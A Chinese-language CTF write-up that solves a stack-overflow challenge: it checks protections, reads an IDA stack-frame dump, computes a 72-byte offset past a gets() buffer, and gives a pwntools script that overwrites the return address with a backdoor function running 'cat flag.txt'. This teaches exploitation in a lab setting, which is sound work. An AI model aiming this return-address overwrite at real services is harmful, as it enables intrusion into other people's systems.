# 题目

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743415482353-76a71838-30e8-4066-912f-bea1fd0fa8c1.png)

# 做法

扔进虚拟机checksec

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743415563502-b82659f7-98a6-4013-a2a9-d709d4c29bc5.png)

64位，没开栈保护

扔进IDA（64位），找到main，F5反编译

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743415741883-dd6f5571-c34c-4f89-92de-6de26143071d.png)

跟上一题差不多，其他没啥作用

然后我们看到`sprintf` 函数，它和gets函数差不多，都可以导致栈溢出

但`sprintf` 函数在我们输入的末尾添加换行符 `\n`了，无法造成栈溢出，也就是我们无法利用`sprintf` 函数进行栈溢出，只能利用gets函数

`(sprintf` 函数不会检查目标缓冲区 `str` 的大小，如果格式化后的字符串长度超过了缓冲区的大小，就会导致缓冲区溢出）

（gets函数不会检查输入字符串的长度，若用户输入的字符串长度超过了 `str` 所指向数组的大小，就会发生缓冲区溢出。）

我们点进v5

完整代码，v5显示的是var_40

```
-0000000000000080 ; D/A/*   : change type (data/ascii/array)
-0000000000000080 ; N       : rename
-0000000000000080 ; U       : undefine
-0000000000000080 ; Use data definition commands to create local variables and function arguments.
-0000000000000080 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0
-0000000000000080 ;
-0000000000000080
-0000000000000080 s               db ?
-000000000000007F                 db ? ; undefined
-000000000000007E                 db ? ; undefined
-000000000000007D                 db ? ; undefined
-000000000000007C                 db ? ; undefined
-000000000000007B                 db ? ; undefined
-000000000000007A                 db ? ; undefined
-0000000000000079                 db ? ; undefined
-0000000000000078                 db ? ; undefined
-0000000000000077                 db ? ; undefined
-0000000000000076                 db ? ; undefined
-0000000000000075                 db ? ; undefined
-0000000000000074                 db ? ; undefined
-0000000000000073                 db ? ; undefined
-0000000000000072                 db ? ; undefined
-0000000000000071                 db ? ; undefined
-0000000000000070                 db ? ; undefined
-000000000000006F                 db ? ; undefined
-000000000000006E                 db ? ; undefined
-000000000000006D                 db ? ; undefined
-000000000000006C                 db ? ; undefined
-000000000000006B                 db ? ; undefined
-000000000000006A                 db ? ; undefined
-0000000000000069                 db ? ; undefined
-0000000000000068                 db ? ; undefined
-0000000000000067                 db ? ; undefined
-0000000000000066                 db ? ; undefined
-0000000000000065                 db ? ; undefined
-0000000000000064                 db ? ; undefined
-0000000000000063                 db ? ; undefined
-0000000000000062                 db ? ; undefined
-0000000000000061                 db ? ; undefined
-0000000000000060                 db ? ; undefined
-000000000000005F                 db ? ; undefined
-000000000000005E                 db ? ; undefined
-000000000000005D                 db ? ; undefined
-000000000000005C                 db ? ; undefined
-000000000000005B                 db ? ; undefined
-000000000000005A                 db ? ; undefined
-0000000000000059                 db ? ; undefined
-0000000000000058                 db ? ; undefined
-0000000000000057                 db ? ; undefined
-0000000000000056                 db ? ; undefined
-0000000000000055                 db ? ; undefined
-0000000000000054                 db ? ; undefined
-0000000000000053                 db ? ; undefined
-0000000000000052                 db ? ; undefined
-0000000000000051                 db ? ; undefined
-0000000000000050                 db ? ; undefined
-000000000000004F                 db ? ; undefined
-000000000000004E                 db ? ; undefined
-000000000000004D                 db ? ; undefined
-000000000000004C                 db ? ; undefined
-000000000000004B                 db ? ; undefined
-000000000000004A                 db ? ; undefined
-0000000000000049                 db ? ; undefined
-0000000000000048                 db ? ; undefined
-0000000000000047                 db ? ; undefined
-0000000000000046                 db ? ; undefined
-0000000000000045                 db ? ; undefined
-0000000000000044                 db ? ; undefined
-0000000000000043                 db ? ; undefined
-0000000000000042                 db ? ; undefined
-0000000000000041                 db ? ; undefined
-0000000000000040 var_40          db ?
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038                 db ? ; undefined
-0000000000000037                 db ? ; undefined
-0000000000000036                 db ? ; undefined
-0000000000000035                 db ? ; undefined
-0000000000000034                 db ? ; undefined
-0000000000000033                 db ? ; undefined
-0000000000000032                 db ? ; undefined
-0000000000000031                 db ? ; undefined
-0000000000000030                 db ? ; undefined
-000000000000002F                 db ? ; undefined
-000000000000002E                 db ? ; undefined
-000000000000002D                 db ? ; undefined
-000000000000002C                 db ? ; undefined
-000000000000002B                 db ? ; undefined
-000000000000002A                 db ? ; undefined
-0000000000000029                 db ? ; undefined
-0000000000000028                 db ? ; undefined
-0000000000000027                 db ? ; undefined
-0000000000000026                 db ? ; undefined
-0000000000000025                 db ? ; undefined
-0000000000000024                 db ? ; undefined
-0000000000000023                 db ? ; undefined
-0000000000000022                 db ? ; undefined
-0000000000000021                 db ? ; undefined
-0000000000000020                 db ? ; undefined
-000000000000001F                 db ? ; undefined
-000000000000001E                 db ? ; undefined
-000000000000001D                 db ? ; undefined
-000000000000001C                 db ? ; undefined
-000000000000001B                 db ? ; undefined
-000000000000001A                 db ? ; undefined
-0000000000000019                 db ? ; undefined
-0000000000000018                 db ? ; undefined
-0000000000000017                 db ? ; undefined
-0000000000000016                 db ? ; undefined
-0000000000000015                 db ? ; undefined
-0000000000000014                 db ? ; undefined
-0000000000000013                 db ? ; undefined
-0000000000000012                 db ? ; undefined
-0000000000000011                 db ? ; undefined
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003                 db ? ; undefined
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

经典栈溢出问题，跟上一道题一样

从上往下数，从var_40到最后一个s是64（即v5的长度为64）然后加上返回函数的8个字节（可以理解成把s的大小加上，刚刚好到达r），共是72，下面那个r代表的是返回地址，我们在这里写入后门函数地址

Shift+F12打开string窗口，一键找出所有的字符串，去寻找它的后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743417325639-a2956c07-bfba-4bf7-84c0-243e4849d40d.png)

我们看到system函数

点进去

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743417351384-a6a9d4a7-bbc0-4421-824a-c50b3cfe10b0.png)

Ctrl+x看看是哪个函数调用了

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743417534135-2fb842c3-fcae-4619-9f5e-ad9a0d085a6e.png)

发现没有啥，然后我们回去，发现了cat flag.txt

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743417505582-28ad18c8-e032-4bb1-adb0-a982952ada55.png)

操作同上

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743417630543-e4e3f297-cf45-4b68-9720-d80a2baec8f3.png)

找到后门函数地址40060D

编写exp

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743420021383-6935c175-62a9-4bc1-aac9-9614288fc17e.png)

代码如下

```
#导入pwntools模块：
from pwn import *

#和靶机进行连接：
r = remote("node5.buuoj.cn",29343)

#定义 payload
payload = b'a' * 72+ p64(0x40060D)

#发送payload
r.sendline(payload)

#获取靶机交互式终端：
r.interactive()
```

payload不懂的请移步至本系列上篇代码注释（rip 1的方法二)

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743420152470-f7fa68c7-5f3a-4027-bf21-0bd1755bb75a.png)

最后，得出flag

# 更新

于2025.4.7